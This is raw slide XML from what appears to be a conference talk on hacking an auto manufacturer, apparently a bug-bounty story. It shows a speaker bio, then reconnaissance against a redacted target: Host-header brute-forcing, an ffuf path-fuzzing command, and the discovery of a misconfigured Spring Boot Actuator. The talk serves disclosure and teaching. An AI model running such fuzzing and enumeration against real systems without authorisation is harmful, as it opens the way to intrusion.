              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre Medium"/>
              <a:ea typeface="Abhaya Libre Medium"/>
              <a:cs typeface="Abhaya Libre Medium"/>
              <a:sym typeface="Abhaya Libre Medium"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-355600" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2000"/>
              <a:buFont typeface="Abhaya Libre Medium"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre Medium"/>
                <a:ea typeface="Abhaya Libre Medium"/>
                <a:cs typeface="Abhaya Libre Medium"/>
                <a:sym typeface="Abhaya Libre Medium"/>
              </a:rPr>
              <a:t>I like </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre Medium"/>
                <a:ea typeface="Abhaya Libre Medium"/>
                <a:cs typeface="Abhaya Libre Medium"/>
                <a:sym typeface="Abhaya Libre Medium"/>
              </a:rPr>
              <a:t>hacking</a:t>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre Medium"/>
              <a:ea typeface="Abhaya Libre Medium"/>
              <a:cs typeface="Abhaya Libre Medium"/>
              <a:sym typeface="Abhaya Libre Medium"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-355600" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2000"/>
              <a:buFont typeface="Abhaya Libre Medium"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre Medium"/>
                <a:ea typeface="Abhaya Libre Medium"/>
                <a:cs typeface="Abhaya Libre Medium"/>
                <a:sym typeface="Abhaya Libre Medium"/>
              </a:rPr>
              <a:t>Co-founder of Boring Mattress Co…it’s a long story. </a:t>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre Medium"/>
              <a:ea typeface="Abhaya Libre Medium"/>
              <a:cs typeface="Abhaya Libre Medium"/>
              <a:sym typeface="Abhaya Libre Medium"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-355600" lvl="1" marL="914400" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2000"/>
              <a:buFont typeface="Abhaya Libre Medium"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre Medium"/>
                <a:ea typeface="Abhaya Libre Medium"/>
                <a:cs typeface="Abhaya Libre Medium"/>
                <a:sym typeface="Abhaya Libre Medium"/>
              </a:rPr>
              <a:t>No </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre Medium"/>
                <a:ea typeface="Abhaya Libre Medium"/>
                <a:cs typeface="Abhaya Libre Medium"/>
                <a:sym typeface="Abhaya Libre Medium"/>
              </a:rPr>
              <a:t>I’m not money laundering</a:t>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre Medium"/>
              <a:ea typeface="Abhaya Libre Medium"/>
              <a:cs typeface="Abhaya Libre Medium"/>
              <a:sym typeface="Abhaya Libre Medium"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-355600" lvl="1" marL="914400" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2000"/>
              <a:buFont typeface="Abhaya Libre Medium"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre Medium"/>
                <a:ea typeface="Abhaya Libre Medium"/>
                <a:cs typeface="Abhaya Libre Medium"/>
                <a:sym typeface="Abhaya Libre Medium"/>
              </a:rPr>
              <a:t>https;//boring.co - if you need a mattress someday 😂</a:t>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre Medium"/>
              <a:ea typeface="Abhaya Libre Medium"/>
              <a:cs typeface="Abhaya Libre Medium"/>
              <a:sym typeface="Abhaya Libre Medium"/>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3F3F3"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="85" name="Shape 85"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="86" name="Google Shape;86;p17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8545425" y="4532900"/>
            <a:ext cx="451200" cy="466200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="dk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 name="Google Shape;87;p17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="12" type="sldNum"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8352133" y="4569192"/>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solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="88" name="Google Shape;88;p17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="774450" y="1940700"/>
            <a:ext cx="7595100" cy="1262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Clr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1100"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="3500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Russo One"/>
                <a:ea typeface="Russo One"/>
                <a:cs typeface="Russo One"/>
                <a:sym typeface="Russo One"/>
              </a:rPr>
              <a:t>Hacking an Auto Manufacturer</a:t>
            </a:r>
            <a:endParaRPr sz="3500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="3500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>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3F3F3"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="92" name="Shape 92"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="93" name="Google Shape;93;p18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8545425" y="4532900"/>
            <a:ext cx="451200" cy="466200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="dk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 name="Google Shape;94;p18"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="12" type="sldNum"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8352133" y="4569192"/>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solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="95" name="Google Shape;95;p18"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="348925" y="266850"/>
            <a:ext cx="7595100" cy="1262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3500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Russo One"/>
                <a:ea typeface="Russo One"/>
                <a:cs typeface="Russo One"/>
                <a:sym typeface="Russo One"/>
              </a:rPr>
              <a:t>Hacking Auto Manufacturer</a:t>
            </a:r>
            <a:endParaRPr sz="3500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="3500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="96" name="Google Shape;96;p18"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="472125" y="1597150"/>
            <a:ext cx="8073300" cy="29706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 sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre Medium"/>
                <a:ea typeface="Abhaya Libre Medium"/>
                <a:cs typeface="Abhaya Libre Medium"/>
                <a:sym typeface="Abhaya Libre Medium"/>
              </a:rPr>
              <a:t>Scanned IP range &amp; found an ingress server:</a:t>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre Medium"/>
              <a:ea typeface="Abhaya Libre Medium"/>
              <a:cs typeface="Abhaya Libre Medium"/>
              <a:sym typeface="Abhaya Libre Medium"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-355600" lvl="1" marL="914400" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2000"/>
              <a:buFont typeface="Abhaya Libre Medium"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre Medium"/>
                <a:ea typeface="Abhaya Libre Medium"/>
                <a:cs typeface="Abhaya Libre Medium"/>
                <a:sym typeface="Abhaya Libre Medium"/>
              </a:rPr>
              <a:t>Response: “</a:t>
            </a:r>
            <a:r>
              <a:rPr i="1" lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>Backend(IP) Not Found</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre Medium"/>
                <a:ea typeface="Abhaya Libre Medium"/>
                <a:cs typeface="Abhaya Libre Medium"/>
                <a:sym typeface="Abhaya Libre Medium"/>
              </a:rPr>
              <a:t>”</a:t>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre Medium"/>
              <a:ea typeface="Abhaya Libre Medium"/>
              <a:cs typeface="Abhaya Libre Medium"/>
              <a:sym typeface="Abhaya Libre Medium"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-355600" lvl="1" marL="914400" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2000"/>
              <a:buFont typeface="Abhaya Libre Medium"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre Medium"/>
                <a:ea typeface="Abhaya Libre Medium"/>
                <a:cs typeface="Abhaya Libre Medium"/>
                <a:sym typeface="Abhaya Libre Medium"/>
              </a:rPr>
              <a:t>SSL Certificate:</a:t>
            </a:r>
            <a:r>
              <a:rPr i="1" lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre Medium"/>
                <a:ea typeface="Abhaya Libre Medium"/>
                <a:cs typeface="Abhaya Libre Medium"/>
                <a:sym typeface="Abhaya Libre Medium"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr i="1" lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>*.apps.redacted.example.com</a:t>
            </a:r>
            <a:endParaRPr i="1" sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="914400" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr i="1" sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-355600" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2000"/>
              <a:buFont typeface="Abhaya Libre Medium"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre Medium"/>
                <a:ea typeface="Abhaya Libre Medium"/>
                <a:cs typeface="Abhaya Libre Medium"/>
                <a:sym typeface="Abhaya Libre Medium"/>
              </a:rPr>
              <a:t>Brute-forced Host header</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>:</a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en" sz="2000">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t> FUZZ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>.apps.redacted.example.com</a:t>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-355600" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2000"/>
              <a:buFont typeface="Abhaya Libre"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre Medium"/>
                <a:ea typeface="Abhaya Libre Medium"/>
                <a:cs typeface="Abhaya Libre Medium"/>
                <a:sym typeface="Abhaya Libre Medium"/>
              </a:rPr>
              <a:t>Found:</a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre"/>
                <a:ea typeface="Abhaya Libre"/>
                <a:cs typeface="Abhaya Libre"/>
                <a:sym typeface="Abhaya Libre"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre Medium"/>
                <a:ea typeface="Abhaya Libre Medium"/>
                <a:cs typeface="Abhaya Libre Medium"/>
                <a:sym typeface="Abhaya Libre Medium"/>
              </a:rPr>
              <a:t>configurator-prod.apps.redacted.example.com</a:t>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre Medium"/>
              <a:ea typeface="Abhaya Libre Medium"/>
              <a:cs typeface="Abhaya Libre Medium"/>
              <a:sym typeface="Abhaya Libre Medium"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="97" name="Google Shape;97;p18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="0"/>
            <a:ext cx="548700" cy="1518900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CC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3F3F3"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="101" name="Shape 101"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="102" name="Google Shape;102;p19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8545425" y="4532900"/>
            <a:ext cx="451200" cy="466200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="dk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 name="Google Shape;103;p19"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="12" type="sldNum"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8352133" y="4569192"/>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solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="104" name="Google Shape;104;p19"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="348925" y="266850"/>
            <a:ext cx="7595100" cy="7233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3500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Russo One"/>
                <a:ea typeface="Russo One"/>
                <a:cs typeface="Russo One"/>
                <a:sym typeface="Russo One"/>
              </a:rPr>
              <a:t>Hacking Auto Manufacturer</a:t>
            </a:r>
            <a:endParaRPr sz="3500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="105" name="Google Shape;105;p19"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="472125" y="1597150"/>
            <a:ext cx="8398200" cy="26235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b="1" lang="en" sz="1700">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>ffuf -u</a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en" sz="1700">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t> http://ingress-server/FUZZ </a:t>
            </a:r>
            <a:endParaRPr b="1" sz="1700">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="914400" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="1700">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>"Host: configurator-prod.apps.redacted.example.com"</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="1700">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="1900">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-349250" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1900"/>
              <a:buFont typeface="Abhaya Libre"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1900">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre"/>
                <a:ea typeface="Abhaya Libre"/>
                <a:cs typeface="Abhaya Libre"/>
                <a:sym typeface="Abhaya Libre"/>
              </a:rPr>
              <a:t>Turns out it was Spring Boot Actuator…and misconfigured</a:t>
            </a:r>
            <a:endParaRPr sz="1900">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre"/>
              <a:ea typeface="Abhaya Libre"/>
              <a:cs typeface="Abhaya Libre"/>
